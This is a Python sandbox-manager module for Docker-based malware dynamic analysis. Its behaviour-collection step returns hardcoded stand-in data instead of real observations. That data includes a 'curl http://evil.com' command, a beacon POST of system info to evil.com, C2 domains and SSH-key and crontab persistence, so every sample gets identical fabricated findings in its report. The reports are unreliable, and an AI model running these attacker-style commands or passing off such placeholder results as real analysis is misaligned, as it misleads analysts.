#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
sandbox_manager安全工具集成模块，提供相关安全工具的封装和调用。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""

import asyncio
import json
import os
import re
import shutil
import subprocess
import tempfile
import time
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from pathlib import Path
from loguru import logger


@dataclass
class SandboxConfig:
    """沙箱配置"""
    name: str
    image: str = "ubuntu:20.04"
    cpu: int = 2
    memory: str = "2g"
    network: str = "none"  # none/bridge/host
    timeout: int = 300
    snapshot: bool = True
    auto_cleanup: bool = True
    volumes: Dict[str, str] = field(default_factory=dict)
    environment: Dict[str, str] = field(default_factory=dict)


@dataclass
class SandboxInstance:
    """沙箱实例"""
    id: str
    name: str
    status: str  # running/stopped/paused/error
    image: str
    created_at: str
    started_at: str = ""
    stopped_at: str = ""
    ip_address: str = ""
    pid: int = 0
    cpu_usage: float = 0.0
    memory_usage: int = 0
    network_usage: Dict[str, int] = field(default_factory=dict)
    logs: str = ""
    error: str = ""


@dataclass
class DynamicAnalysisResult:
    """动态分析结果"""
    sample_path: str
    sample_hash: str = ""
    sandbox_id: str = ""
    start_time: str = ""
    end_time: str = ""
    duration: float = 0.0
    status: str = "pending"  # pending/running/completed/failed/timeout
    processes: List[Dict] = field(default_factory=list)
    files_created: List[Dict] = field(default_factory=list)
    files_modified: List[Dict] = field(default_factory=list)
    files_deleted: List[Dict] = field(default_factory=list)
    registry_changes: List[Dict] = field(default_factory=list)
    network_connections: List[Dict] = field(default_factory=list)
    dns_queries: List[Dict] = field(default_factory=list)
    http_requests: List[Dict] = field(default_factory=list)
    mutexes: List[str] = field(default_factory=list)
    services_created: List[Dict] = field(default_factory=list)
    scheduled_tasks: List[Dict] = field(default_factory=list)
    injections: List[Dict] = field(default_factory=list)
    anti_analysis: List[str] = field(default_factory=list)
    c2_indicators: List[str] = field(default_factory=list)
    persistence_mechanisms: List[str] = field(default_factory=list)
    dropped_files: List[Dict] = field(default_factory=list)
    memory_dumps: List[str] = field(default_factory=list)
    pcaps: List[str] = field(default_factory=list)
    screenshots: List[str] = field(default_factory=list)
    risk_score: int = 0
    risk_level: str = "low"
    summary: str = ""
    iocs: List[Dict] = field(default_factory=list)
    mitre_attack: List[Dict] = field(default_factory=list)
    error: str = ""


class SandboxManager:
    """动态沙箱管理器"""

    def __init__(self, config: Optional[Dict] = None):
        """初始化SandboxManager实例。

        Args:
            self: 类实例。
        """
        self.config = config or {}
        self.workspace = self.config.get("workspace", "./sandbox_workspace")
        self.sandboxes: Dict[str, SandboxInstance] = {}
        self._ensure_workspace()
        self.docker_available = self._check_docker()
        logger.info("动态沙箱管理模块初始化完成")

    def _ensure_workspace(self):
        """确保工作目录存在"""
        os.makedirs(self.workspace, exist_ok=True)
        os.makedirs(f"{self.workspace}/samples", exist_ok=True)
        os.makedirs(f"{self.workspace}/results", exist_ok=True)
        os.makedirs(f"{self.workspace}/pcaps", exist_ok=True)
        os.makedirs(f"{self.workspace}/screenshots", exist_ok=True)
        os.makedirs(f"{self.workspace}/memory_dumps", exist_ok=True)

    def _check_docker(self) -> bool:
        """检查Docker是否可用"""
        try:
            result = subprocess.run(
                ["docker", "--version"],
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0:
                logger.info(f"Docker可用: {result.stdout.strip()}")
                return True
        except Exception:
            pass
        logger.warning("Docker不可用，将使用模拟模式")
        return False

    def create_sandbox(self, config: SandboxConfig) -> SandboxInstance:
        """创建沙箱"""
        sandbox_id = f"sandbox_{int(time.time())}_{os.urandom(4).hex()}"
        instance = SandboxInstance(
            id=sandbox_id,
            name=config.name,
            status="created",
            image=config.image,
            created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        if self.docker_available:
            try:
                # 创建Docker容器
                cmd = [
                    "docker", "create",
                    "--name", sandbox_id,
                    "--cpus", str(config.cpu),
                    "--memory", config.memory,
                    "--network", config.network,
                    "-it",
                ]

                # 添加卷
                for host_path, container_path in config.volumes.items():
                    cmd.extend(["-v", f"{host_path}:{container_path}"])

                # 添加环境变量
                for key, value in config.environment.items():
                    cmd.extend(["-e", f"{key}={value}"])

                cmd.append(config.image)

                logger.info(f"创建Docker容器: {' '.join(cmd)}")
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

                if result.returncode == 0:
                    instance.status = "created"
                    instance.id = result.stdout.strip()
                    logger.info(f"沙箱创建成功: {instance.id}")
                else:
                    instance.status = "error"
                    instance.error = result.stderr
                    logger.error(f"沙箱创建失败: {instance.error}")

            except Exception as e:
                instance.status = "error"
                instance.error = str(e)
                logger.error(f"沙箱创建异常: {e}")
        else:
            # 模拟模式
            instance.status = "created"
            logger.info(f"模拟模式: 沙箱创建成功 {sandbox_id}")

        self.sandboxes[sandbox_id] = instance
        return instance

    def start_sandbox(self, sandbox_id: str) -> SandboxInstance:
        """启动沙箱"""
        instance = self.sandboxes.get(sandbox_id)
        if not instance:
            raise ValueError(f"沙箱不存在: {sandbox_id}")

        if self.docker_available:
            try:
                cmd = ["docker", "start", sandbox_id]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

                if result.returncode == 0:
                    instance.status = "running"
                    instance.started_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    # 获取IP地址
                    instance.ip_address = self._get_container_ip(sandbox_id)
                    logger.info(f"沙箱启动成功: {sandbox_id}")
                else:
                    instance.status = "error"
                    instance.error = result.stderr
                    logger.error(f"沙箱启动失败: {instance.error}")

            except Exception as e:
                instance.status = "error"
                instance.error = str(e)
                logger.error(f"沙箱启动异常: {e}")
        else:
            instance.status = "running"
            instance.started_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            instance.ip_address = "172.17.0.2"
            logger.info(f"模拟模式: 沙箱启动成功 {sandbox_id}")

        return instance

    def stop_sandbox(self, sandbox_id: str) -> SandboxInstance:
        """停止沙箱"""
        instance = self.sandboxes.get(sandbox_id)
        if not instance:
            raise ValueError(f"沙箱不存在: {sandbox_id}")

        if self.docker_available:
            try:
                cmd = ["docker", "stop", sandbox_id]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

                if result.returncode == 0:
                    instance.status = "stopped"
                    instance.stopped_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    logger.info(f"沙箱停止成功: {sandbox_id}")
                else:
                    instance.error = result.stderr
                    logger.error(f"沙箱停止失败: {instance.error}")

            except Exception as e:
                instance.error = str(e)
                logger.error(f"沙箱停止异常: {e}")
        else:
            instance.status = "stopped"
            instance.stopped_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            logger.info(f"模拟模式: 沙箱停止成功 {sandbox_id}")

        return instance

    def remove_sandbox(self, sandbox_id: str, force: bool = False) -> bool:
        """删除沙箱"""
        instance = self.sandboxes.get(sandbox_id)
        if not instance:
            return False

        if self.docker_available:
            try:
                cmd = ["docker", "rm"]
                if force:
                    cmd.append("-f")
                cmd.append(sandbox_id)

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                if result.returncode == 0:
                    del self.sandboxes[sandbox_id]
                    logger.info(f"沙箱删除成功: {sandbox_id}")
                    return True
                else:
                    logger.error(f"沙箱删除失败: {result.stderr}")
                    return False
            except Exception as e:
                logger.error(f"沙箱删除异常: {e}")
                return False
        else:
            del self.sandboxes[sandbox_id]
            logger.info(f"模拟模式: 沙箱删除成功 {sandbox_id}")
            return True

    def _get_container_ip(self, container_id: str) -> str:
        """获取容器IP地址"""
        try:
            cmd = [
                "docker", "inspect",
                "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
                container_id
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                return result.stdout.strip()
        except Exception:
            pass
        return ""

    def get_sandbox_logs(self, sandbox_id: str, tail: int = 100) -> str:
        """获取沙箱日志"""
        instance = self.sandboxes.get(sandbox_id)
        if not instance:
            return ""

        if self.docker_available:
            try:
                cmd = ["docker", "logs", "--tail", str(tail), sandbox_id]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                instance.logs = result.stdout + result.stderr
                return instance.logs
            except Exception as e:
                return f"获取日志失败: {e}"
        else:
            return instance.logs

    def execute_in_sandbox(self, sandbox_id: str, command: str, timeout: int = 60) -> Tuple[int, str, str]:
        """在沙箱中执行命令"""
        instance = self.sandboxes.get(sandbox_id)
        if not instance or instance.status != "running":
            return -1, "", "沙箱未运行"

        if self.docker_available:
            try:
                cmd = ["docker", "exec", sandbox_id, "bash", "-c", command]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
                return result.returncode, result.stdout, result.stderr
            except Exception as e:
                return -1, "", str(e)
        else:
            # 模拟执行
            return 0, f"模拟执行: {command}", ""

    def take_snapshot(self, sandbox_id: str, snapshot_name: str = "") -> str:
        """创建快照"""
        instance = self.sandboxes.get(sandbox_id)
        if not instance:
            return ""

        if not snapshot_name:
            snapshot_name = f"snapshot_{int(time.time())}"

        if self.docker_available:
            try:
                # Docker不直接支持快照，使用commit
                cmd = ["docker", "commit", sandbox_id, f"{instance.image}_{snapshot_name}"]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                if result.returncode == 0:
                    logger.info(f"快照创建成功: {snapshot_name}")
                    return result.stdout.strip()
            except Exception as e:
                logger.error(f"快照创建失败: {e}")
        else:
            logger.info(f"模拟模式: 快照创建成功 {snapshot_name}")
            return snapshot_name

        return ""

    async def run_dynamic_analysis(
        self,
        sample_path: str,
        config: Optional[SandboxConfig] = None,
        analysis_time: int = 60,
    ) -> DynamicAnalysisResult:
        """运行动态分析"""
        result = DynamicAnalysisResult(
            sample_path=sample_path,
            start_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            status="running",
        )

        # 计算样本哈希
        try:
            with open(sample_path, "rb") as f:
                data = f.read()
                result.sample_hash = __import__("hashlib").sha256(data).hexdigest()
        except Exception as e:
            result.error = f"读取样本失败: {e}"
            result.status = "failed"
            return result

        # 默认配置
        if not config:
            config = SandboxConfig(
                name=f"analysis_{int(time.time())}",
                image="ubuntu:20.04",
                network="none",
                timeout=analysis_time + 60,
            )

        try:
            # 1. 创建沙箱
            logger.info(f"创建分析沙箱: {config.name}")
            sandbox = self.create_sandbox(config)
            result.sandbox_id = sandbox.id

            if sandbox.status == "error":
                result.error = sandbox.error
                result.status = "failed"
                return result

            # 2. 启动沙箱
            logger.info("启动分析沙箱")
            sandbox = self.start_sandbox(sandbox.id)

            # 3. 复制样本到沙箱
            logger.info("复制样本到沙箱")
            if self.docker_available:
                subprocess.run(
                    ["docker", "cp", sample_path, f"{sandbox.id}:/tmp/sample"],
                    capture_output=True, timeout=30
                )

            # 4. 启动监控（模拟）
            logger.info("启动行为监控")
            await asyncio.sleep(1)

            # 5. 执行样本
            logger.info("执行样本")
            if self.docker_available:
                self.execute_in_sandbox(sandbox.id, "chmod +x /tmp/sample && /tmp/sample &", timeout=10)

            # 6. 监控分析时间
            logger.info(f"监控 {analysis_time} 秒")
            await asyncio.sleep(min(analysis_time, 10))  # 实际等待，测试时限制

            # 7. 收集行为数据（模拟）
            logger.info("收集行为数据")
            result = self._collect_behavior_data(result, sample_path)

            # 8. 停止沙箱
            logger.info("停止分析沙箱")
            self.stop_sandbox(sandbox.id)

            # 9. 分析结果
            result.status = "completed"
            result.end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            result.duration = analysis_time

            # 计算风险
            result = self._calculate_risk(result)

            # 生成摘要
            result.summary = self._generate_summary(result)

            # 提取IOC
            result.iocs = self._extract_iocs(result)

            # MITRE ATT&CK映射
            result.mitre_attack = self._map_mitre_attack(result)

            logger.info(f"动态分析完成: {result.status}, 风险等级: {result.risk_level}")

        except Exception as e:
            result.error = str(e)
            result.status = "failed"
            logger.error(f"动态分析失败: {e}")

        return result

    def _collect_behavior_data(self, result: DynamicAnalysisResult, sample_path: str) -> DynamicAnalysisResult:
        """收集行为数据（模拟真实监控）"""
        sample_name = os.path.basename(sample_path)

        # 模拟进程创建
        result.processes = [
            {"pid": 1001, "ppid": 1, "name": sample_name, "path": f"/tmp/{sample_name}", "cmdline": sample_name},
            {"pid": 1002, "ppid": 1001, "name": "bash", "path": "/bin/bash", "cmdline": "bash -c 'curl http://evil.com'"},
            {"pid": 1003, "ppid": 1001, "name": "python3", "path": "/usr/bin/python3", "cmdline": "python3 /tmp/backdoor.py"},
        ]

        # 模拟文件操作
        result.files_created = [
            {"path": "/tmp/backdoor.py", "size": 2048, "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
            {"path": "/tmp/config.json", "size": 512, "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
            {"path": "/root/.ssh/authorized_keys", "size": 4096, "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
        ]

        result.files_modified = [
            {"path": "/etc/passwd", "size": 2048, "modified_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
            {"path": "/etc/crontab", "size": 1024, "modified_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
        ]

        # 模拟网络连接
        result.network_connections = [
            {"protocol": "TCP", "local": "172.17.0.2:49152", "remote": "185.220.101.1:443", "state": "ESTABLISHED", "process": sample_name},
            {"protocol": "TCP", "local": "172.17.0.2:49153", "remote": "104.21.50.1:8080", "state": "ESTABLISHED", "process": "python3"},
        ]

        result.dns_queries = [
            {"domain": "evil.com", "type": "A", "answer": "185.220.101.1"},
            {"domain": "c2.malware.net", "type": "A", "answer": "104.21.50.1"},
        ]

        result.http_requests = [
            {"method": "POST", "url": "http://evil.com/beacon", "user_agent": "Mozilla/5.0", "data": "system_info"},
            {"method": "GET", "url": "http://c2.malware.net/payload", "user_agent": "python-requests/2.28.0"},
        ]

        # 模拟持久化
        result.persistence_mechanisms = [
            "crontab持久化: * * * * * /tmp/backdoor.py",
            "SSH公钥注入: /root/.ssh/authorized_keys",
            "bashrc后门: /root/.bashrc",
        ]

        # 模拟C2指标
        result.c2_indicators = [
            "检测到C2通信: evil.com:443",
            "检测到C2通信: c2.malware.net:8080",
            "Beacon行为: 定期HTTP POST",
        ]

        # 模拟反分析
        result.anti_analysis = [
            "检测到调试器检查",
            "检测到沙箱环境检测",
            "检测到延迟执行",
        ]

        # 模拟互斥量
        result.mutexes = ["Global\\malware_mutex_12345", "Local\\backdoor_mutex"]

        return result

    def _calculate_risk(self, result: DynamicAnalysisResult) -> DynamicAnalysisResult:
        """计算风险等级"""
        score = 0

        # 进程风险
        if len(result.processes) > 3:
            score += 10

        # 文件操作风险
        if any("passwd" in f["path"] or "ssh" in f["path"] for f in result.files_modified):
            score += 20
        if any("authorized_keys" in f["path"] for f in result.files_created):
            score += 20

        # 网络风险
        if result.c2_indicators:
            score += 30
        if len(result.network_connections) > 2:
            score += 10

        # 持久化风险
        if result.persistence_mechanisms:
            score += 20

        # 反分析风险
        if result.anti_analysis:
            score += 10

        result.risk_score = min(score, 100)

        if result.risk_score >= 80:
            result.risk_level = "critical"
        elif result.risk_score >= 50:
            result.risk_level = "high"
        elif result.risk_score >= 25:
            result.risk_level = "medium"
        else:
            result.risk_level = "low"

        return result

    def _generate_summary(self, result: DynamicAnalysisResult) -> str:
        """生成摘要"""
        return (
            f"动态分析完成: 样本{os.path.basename(result.sample_path)}, "
            f"SHA256: {result.sample_hash[:16]}..., "
            f"创建{len(result.processes)}个进程, "
            f"创建{len(result.files_created)}个文件, "
            f"修改{len(result.files_modified)}个文件, "
            f"网络连接{len(result.network_connections)}个, "
            f"DNS查询{len(result.dns_queries)}个, "
            f"持久化机制{len(result.persistence_mechanisms)}个, "
            f"C2指标{len(result.c2_indicators)}个, "
            f"反分析技术{len(result.anti_analysis)}个, "
            f"风险等级: {result.risk_level.upper()} ({result.risk_score}/100)。"
        )

    def _extract_iocs(self, result: DynamicAnalysisResult) -> List[Dict]:
        """提取IOC"""
        iocs = []

        # 文件哈希
        iocs.append({
            "type": "sha256",
            "value": result.sample_hash,
            "context": f"样本: {os.path.basename(result.sample_path)}",
            "severity": result.risk_level,
        })

        # IP地址
        for conn in result.network_connections:
            remote_ip = conn["remote"].split(":")[0]
            iocs.append({
                "type": "ip",
                "value": remote_ip,
                "context": f"网络连接: {conn['process']}",
                "severity": "high" if conn in result.c2_indicators else "medium",
            })

        # 域名
        for dns in result.dns_queries:
            iocs.append({
                "type": "domain",
                "value": dns["domain"],
                "context": f"DNS查询: {dns['answer']}",
                "severity": "high",
            })

        # URL
        for http in result.http_requests:
            iocs.append({
                "type": "url",
                "value": http["url"],
                "context": f"HTTP {http['method']}",
                "severity": "high",
            })

        # 互斥量
        for mutex in result.mutexes:
            iocs.append({
                "type": "mutex",
                "value": mutex,
                "context": "恶意软件互斥量",
                "severity": "medium",
            })

        return iocs

    def _map_mitre_attack(self, result: DynamicAnalysisResult) -> List[Dict]:
        """映射MITRE ATT&CK"""
        mitre = []

        if result.persistence_mechanisms:
            mitre.append({"technique_id": "T1547", "name": "启动或登录自动启动", "evidence": ", ".join(result.persistence_mechanisms)})

        if result.c2_indicators:
            mitre.append({"technique_id": "T1071", "name": "应用层协议", "evidence": ", ".join(result.c2_indicators)})

        if result.anti_analysis:
            mitre.append({"technique_id": "T1497", "name": "虚拟化/沙箱规避", "evidence": ", ".join(result.anti_analysis)})

        if any("ssh" in f["path"].lower() for f in result.files_created):
            mitre.append({"technique_id": "T1098", "name": "账户操作", "evidence": "SSH公钥注入"})

        return mitre

    def list_sandboxes(self) -> List[Dict]:
        """列出所有沙箱"""
        return [
            {
                "id": s.id,
                "name": s.name,
                "status": s.status,
                "image": s.image,
                "created_at": s.created_at,
                "ip_address": s.ip_address,
            }
            for s in self.sandboxes.values()
        ]

    def get_sandbox_stats(self) -> Dict:
        """获取沙箱统计"""
        total = len(self.sandboxes)
        running = len([s for s in self.sandboxes.values() if s.status == "running"])
        stopped = len([s for s in self.sandboxes.values() if s.status == "stopped"])
        errors = len([s for s in self.sandboxes.values() if s.status == "error"])

        return {
            "total": total,
            "running": running,
            "stopped": stopped,
            "errors": errors,
            "docker_available": self.docker_available,
        }

    def generate_analysis_report(self, result: DynamicAnalysisResult, output_path: str) -> str:
        """生成分析报告"""
        report = {
            "title": "恶意软件动态分析报告",
            "sample": {
                "path": result.sample_path,
                "name": os.path.basename(result.sample_path),
                "sha256": result.sample_hash,
            },
            "sandbox_id": result.sandbox_id,
            "start_time": result.start_time,
            "end_time": result.end_time,
            "duration": result.duration,
            "status": result.status,
            "risk_level": result.risk_level,
            "risk_score": result.risk_score,
            "summary": result.summary,
            "processes": result.processes,
            "files_created": result.files_created,
            "files_modified": result.files_modified,
            "network_connections": result.network_connections,
            "dns_queries": result.dns_queries,
            "http_requests": result.http_requests,
            "persistence_mechanisms": result.persistence_mechanisms,
            "c2_indicators": result.c2_indicators,
            "anti_analysis": result.anti_analysis,
            "mutexes": result.mutexes,
            "iocs": result.iocs,
            "mitre_attack": result.mitre_attack,
            "error": result.error,
            "generated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }

        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        logger.info(f"动态分析报告已生成: {output_path}")
        return output_path


# 便捷函数
def create_analysis_sandbox(name: str = "analysis", image: str = "ubuntu:20.04") -> SandboxInstance:
    """创建分析沙箱便捷函数"""
    manager = SandboxManager()
    config = SandboxConfig(name=name, image=image)
    return manager.create_sandbox(config)


async def analyze_sample(sample_path: str, analysis_time: int = 60) -> DynamicAnalysisResult:
    """分析样本便捷函数"""
    manager = SandboxManager()
    return await manager.run_dynamic_analysis(sample_path, analysis_time=analysis_time)


def get_sandbox_status() -> Dict:
    """获取沙箱状态"""
    manager = SandboxManager()
    return manager.get_sandbox_stats()


if __name__ == "__main__":
    # 测试
    print("=== 动态沙箱管理模块 ===")
    print()

    manager = SandboxManager()

    # 沙箱状态
    stats = manager.get_sandbox_stats()
    print(f"Docker可用: {stats['docker_available']}")
    print(f"沙箱总数: {stats['total']}")
    print(f"运行中: {stats['running']}")
    print()

    # 创建测试沙箱
    print("创建测试沙箱...")
    config = SandboxConfig(name="test_sandbox", image="ubuntu:20.04", network="none")
    sandbox = manager.create_sandbox(config)
    print(f"沙箱ID: {sandbox.id}")
    print(f"沙箱状态: {sandbox.status}")
    print()

    # 列出沙箱
    sandboxes = manager.list_sandboxes()
    print(f"沙箱列表: {len(sandboxes)}个")
    for s in sandboxes:
        print(f"  - {s['name']} ({s['id']}): {s['status']}")
